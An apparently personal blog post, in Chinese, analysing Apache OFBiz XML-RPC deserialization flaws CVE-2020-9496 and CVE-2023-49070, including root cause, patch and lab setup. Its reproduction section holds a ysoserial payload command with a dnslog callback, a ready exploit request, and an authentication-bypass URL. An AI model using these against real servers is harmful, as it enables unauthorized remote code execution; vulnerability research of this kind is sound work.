@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Apache OFBiz简介Apache OFBiz (The Apache Open For Business Project) 是一个开源的企业自动化软件项目，它包含了ERP（企业资源计划）、CRM（客户关系管理）、电子商务等多个模块的框架系统。该项目提供了一个灵活的业务流程管理和自动化平台，被广泛应用于企业环境中。 XML-RPC技术概述XML-RPC是一个规范和一组实现，允许软件在不同的操">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2025/01/06/Apache%20OFBiz%20XML-RPC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Apache OFBiz简介Apache OFBiz (The Apache Open For Business Project) 是一个开源的企业自动化软件项目，它包含了ERP（企业资源计划）、CRM（客户关系管理）、电子商务等多个模块的框架系统。该项目提供了一个灵活的业务流程管理和自动化平台，被广泛应用于企业环境中。 XML-RPC技术概述XML-RPC是一个规范和一组实现，允许软件在不同的操">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732418416262-f3f4d876-325b-4290-b305-a106e8b5aa6c.png?x-oss-process=image/format,webp/resize,w_937,limit_0">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732418436068-089ca4ec-a6e6-470b-bd3a-9b4ff5ec4320.png?x-oss-process=image/format,webp/resize,w_937,limit_0">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1734686898386-4ab6048c-2a57-4f84-954a-76c6df874177.png?x-oss-process=image/format,webp/resize,w_937,limit_0">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1734687479663-c42a6892-cd69-4305-93dc-346b32f2b1a0.png?x-oss-process=image/format,webp">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1734687739853-efec0178-9be9-46d2-9d58-a23921a43250.png?x-oss-process=image/format,webp/resize,w_811,limit_0">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/jpeg/683328/1734690724682-5bb3f33c-e7c3-48c7-9524-5f663ec0d0b3.jpeg?x-oss-process=image/format,webp/resize,w_690,limit_0/interlace,1">
+<meta property="article:published_time" content="2025-01-06T15:36:07.755Z">
+<meta property="article:modified_time" content="2025-01-06T03:08:17.495Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732418416262-f3f4d876-325b-4290-b305-a106e8b5aa6c.png?x-oss-process=image/format,webp/resize,w_937,limit_0">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Apache OFBiz XML-RPC漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/06/Apache%20OFBiz%20XML-RPC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
+  <time class="dt-published" datetime="2025-01-06T15:36:07.755Z" itemprop="datePublished">2025-01-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Apache-OFBiz简介"><a href="#Apache-OFBiz简介" class="headerlink" title="Apache OFBiz简介"></a>Apache OFBiz简介</h1><p>Apache OFBiz (The Apache Open For Business Project) 是一个开源的企业自动化软件项目，它包含了ERP（企业资源计划）、CRM（客户关系管理）、电子商务等多个模块的框架系统。该项目提供了一个灵活的业务流程管理和自动化平台，被广泛应用于企业环境中。</p>
+<h1 id="XML-RPC技术概述"><a href="#XML-RPC技术概述" class="headerlink" title="XML-RPC技术概述"></a>XML-RPC技术概述</h1><p>XML-RPC是一个规范和一组实现，允许软件在不同的操作系统上运行，在不同的环境中运行以通过网络进行过程调用。XML-RPC是使用 HTTP 作为传输和 XML 作为编码的远程过程调用。XML-RPC 被设计得尽可能简单，同时允许传输、处理和返回复杂的数据结构。</p>
+<h2 id="XML-RPC请求结构"><a href="#XML-RPC请求结构" class="headerlink" title="XML-RPC请求结构"></a>XML-RPC请求结构</h2><p>XML-RPC请求响应相关内容具体参考：<a target="_blank" rel="noopener" href="http://xmlrpc.com/spec.md">http://xmlrpc.com/spec.md</a></p>
+<p>XML-RPC数据类型具体参考：<a target="_blank" rel="noopener" href="https://ws.apache.org/xmlrpc/types.html">https://ws.apache.org/xmlrpc/types.html</a></p>
+<h3 id="基本要求"><a href="#基本要求" class="headerlink" title="基本要求"></a>基本要求</h3><ul>
+<li>请求必须使用 Content-Type: text&#x2F;xml</li>
+<li>根标签为 methodCall，必须包含 methodName 子标签</li>
+<li>参数通过 params 标签传递，每个参数都包含在 param 标签中</li>
+<li>参数值默认为string类型，可以通过特定标签指定其他数据类型</li>
+</ul>
+<h2 id="请求示例"><a href="#请求示例" class="headerlink" title="请求示例"></a>请求示例</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /RPC2 HTTP/1.0</span><br><span class="line">User-Agent: Frontier/5.1.2 (WinNT)</span><br><span class="line">Host: betty.userland.com</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-length: 181</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>examples.getStateName<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">params</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">i4</span>&gt;</span>41<span class="tag">&lt;/<span class="name">i4</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="CVE-2020-9496漏洞分析"><a href="#CVE-2020-9496漏洞分析" class="headerlink" title="CVE-2020-9496漏洞分析"></a>CVE-2020-9496漏洞分析</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><ul>
+<li>影响版本：Apache OFBiz &lt; 17.12.04</li>
+<li>漏洞类型：远程代码执行</li>
+<li>漏洞等级：严重</li>
+</ul>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>参考Vulhub：<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/ofbiz/CVE-2020-9496/">https://vulhub.org/#/environments/ofbiz/CVE-2020-9496/</a></p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>当服务器启用了enabledForExtensions选项时，攻击者可以通过发送特制的XML-RPC请求，利用Apache Commons BeanUtils实现远程代码执行。这个漏洞主要涉及反序列化操作，攻击者可以通过构造恶意的序列化数据来实现代码执行。</p>
+<p>注：</p>
+<p>如果XML-RPC服务端设置了enabledForExtensions，那么就支持附加的数据类型，其中包括<serializable>标签，其中的内容为一个对象被转换为序列化的表示形式并作为Base64编码的字节数组。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="Payload生成"><a href="#Payload生成" class="headerlink" title="Payload生成"></a>Payload生成</h3><p>使用ysoserial生成payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 <span class="string">&quot;ping -nc 1 ofbiz.xudce2.dnslog.cn&quot;</span> | <span class="built_in">base64</span> | <span class="built_in">tr</span> -d <span class="string">&quot;\\n&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击请求构造"><a href="#攻击请求构造" class="headerlink" title="攻击请求构造"></a>攻击请求构造</h3><p>向&#x2F;webtools&#x2F;control&#x2F;xmlrpc接口发送payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /webtools/control/xmlrpc HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 4093</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>ProjectDiscovery<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">params</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">struct</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">member</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>test<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">serializable</span> <span class="attr">xmlns</span>=<span class="string">&quot;&lt;http://ws.apache.org/xmlrpc/namespaces/extensions&gt;&quot;</span>&gt;</span>[base64-payload]<span class="tag">&lt;/<span class="name">serializable</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">member</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">struct</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732418416262-f3f4d876-325b-4290-b305-a106e8b5aa6c.png?x-oss-process=image/format,webp/resize,w_937,limit_0"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732418436068-089ca4ec-a6e6-470b-bd3a-9b4ff5ec4320.png?x-oss-process=image/format,webp/resize,w_937,limit_0"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="Web路由配置"><a href="#Web路由配置" class="headerlink" title="Web路由配置"></a>Web路由配置</h3><p>&#x2F;control&#x2F;*接口的处理是由org.apache.ofbiz.webapp.control.ControlServlet来操作。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- framework\\webtools\\webapp\\webtools\\WEB-INF\\web.xml --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Main Control Servlet<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.ofbiz.webapp.control.ControlServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/control/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="关键配置分析"><a href="#关键配置分析" class="headerlink" title="关键配置分析"></a>关键配置分析</h3><p>framework&#x2F;webtools&#x2F;webapp&#x2F;webtools&#x2F;WEB-INF&#x2F;web.xml中设置了enabledForExtensions为true，使XML-RPC支持<serializable>标签进行Java序列化数据传输。</p>
+<p>&#x2F;WEB-INF&#x2F;controller.xml中xmlrpc URI的配置缺少auth选项（默认false），导致未授权访问。</p>
+<h3 id="XXE防护机制"><a href="#XXE防护机制" class="headerlink" title="XXE防护机制"></a>XXE防护机制</h3><p>系统通过设置XmlRpcRequestParser作为ContentHandler并配置以下选项防御XXE：</p>
+<ul>
+<li>**disallow-doctype-decl：**禁止DOCTYPE声明，防止XML实体攻击</li>
+<li>**load-external-dtd：**禁止加载外部DTD</li>
+<li>**external-general-entities和external-parameter-entities：**禁止解析外部实体</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1734686898386-4ab6048c-2a57-4f84-954a-76c6df874177.png?x-oss-process=image/format,webp/resize,w_937,limit_0"></p>
+<h3 id="漏洞触发流程"><a href="#漏洞触发流程" class="headerlink" title="漏洞触发流程"></a>漏洞触发流程</h3><ol>
+<li>ControlServlet处理&#x2F;control&#x2F;接口请求</li>
+<li>doGet()函数调用getRequest()获取XmlRpcRequest实例</li>
+<li>使用SAX解析XML内容</li>
+<li>ContentHandler.startElement()解析XML标签，设置ContentHandler为XmlRpcRequestParser</li>
+<li>识别serializable标签并通过SerializableParser处理</li>
+<li>getResult()函数调用readObject()进行反序列化，触发漏洞</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1734687479663-c42a6892-cd69-4305-93dc-346b32f2b1a0.png?x-oss-process=image/format,webp"></p>
+<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>官方更新：<a target="_blank" rel="noopener" href="https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a">https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a</a></p>
+<p>主要修复措施：</p>
+<ul>
+<li>添加接口认证：要求访问&#x2F;webtools&#x2F;control&#x2F;xmlrpc必须进行身份验证</li>
+<li>增加内容过滤：禁止&#x2F;control&#x2F;xmlrpc路径包含serializable标签的请求通过</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1734687739853-efec0178-9be9-46d2-9d58-a23921a43250.png?x-oss-process=image/format,webp/resize,w_811,limit_0"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/683328/1734690724682-5bb3f33c-e7c3-48c7-9524-5f663ec0d0b3.jpeg?x-oss-process=image/format,webp/resize,w_690,limit_0/interlace,1"></p>
+<h1 id="CVE-2023-49070漏洞分析"><a href="#CVE-2023-49070漏洞分析" class="headerlink" title="CVE-2023-49070漏洞分析"></a>CVE-2023-49070漏洞分析</h1><p>CVE-2023-49070是对CVE-2020-9496补丁的绕过漏洞，主要利用了两个技术点：</p>
+<h2 id="URI绕过技术"><a href="#URI绕过技术" class="headerlink" title="URI绕过技术"></a>URI绕过技术</h2><p>利用Tomcat的URI解析特性，使用&#x2F;control&#x2F;xmlrpc;&#x2F;格式绕过过滤器检查。</p>
+<h2 id="认证绕过方法"><a href="#认证绕过方法" class="headerlink" title="认证绕过方法"></a>认证绕过方法</h2><p>认证绕过的关键在于满足以下条件：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (username == <span class="literal">null</span></span><br><span class="line">                    || (password == <span class="literal">null</span> &amp;&amp; token == <span class="literal">null</span>)</span><br><span class="line">                    || <span class="string">&quot;error&quot;</span>.equals(login(request, response)))</span><br></pre></td></tr></table></figure>
+
+<p>通过构造特殊URL格式实现绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/xxxx/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzk0MTIxNzAyNw==&mid=2247483960&idx=1&sn=152320b737ddea7c1a29a5d3ba4dba83">https://mp.weixin.qq.com/s?__biz&#x3D;Mzk0MTIxNzAyNw&#x3D;&#x3D;&amp;mid&#x3D;2247483960&amp;idx&#x3D;1&amp;sn&#x3D;152320b737ddea7c1a29a5d3ba4dba83</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2021/09/21/%E6%B5%85%E6%9E%90Ofbiz%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-9496%EF%BC%89">http://www.mi1k7ea.com/2021/09/21/浅析Ofbiz反序列化漏洞（CVE-2020-9496）</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/386458.html">https://www.freebuf.com/vuls/386458.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13168">https://xz.aliyun.com/t/13168</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/06/Apache%20OFBiz%20XML-RPC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="cm5l7vlhr0004fscx3dh1655v" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/01/06/shiro%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/01/06/MySQL%20JDBC%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/01/06/JNDI%E6%B3%A8%E5%85%A5/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/06/%E5%8E%9F%E7%94%9FJDK%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/06/CC%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/06/CB%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/06/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
